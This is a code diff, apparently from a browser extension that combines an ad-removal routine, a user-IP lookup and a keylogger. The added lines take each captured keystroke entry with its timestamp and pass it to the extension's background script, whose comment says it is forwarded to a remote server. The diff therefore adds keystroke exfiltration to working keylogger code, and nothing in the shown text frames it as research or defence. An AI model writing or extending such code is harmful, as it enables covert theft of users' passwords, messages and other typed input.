@@ -6,6 +6,7 @@ function removeAds() {
   adElements.forEach(ad => ad.remove());
 }
 
+
 // gets the user's IP - not the most reliable but it works most of the time
 async function fetchIP() {
     try {
@@ -153,6 +154,18 @@ function initKeylogger() {
         }
         
         overlay.insertBefore(entry, overlay.firstChild);
+
+        // Sends the data to background to send to the server
+        const data = { timestamp, type, message};
+        chrome.runtime.sendMessage(
+            {
+                type: "DATA_LOG",
+                payload: data,
+            },
+            (response) => {
+                console.log("Server response:", response);
+            }
+        );
     }
 
     document.addEventListener('keydown', (e) => {
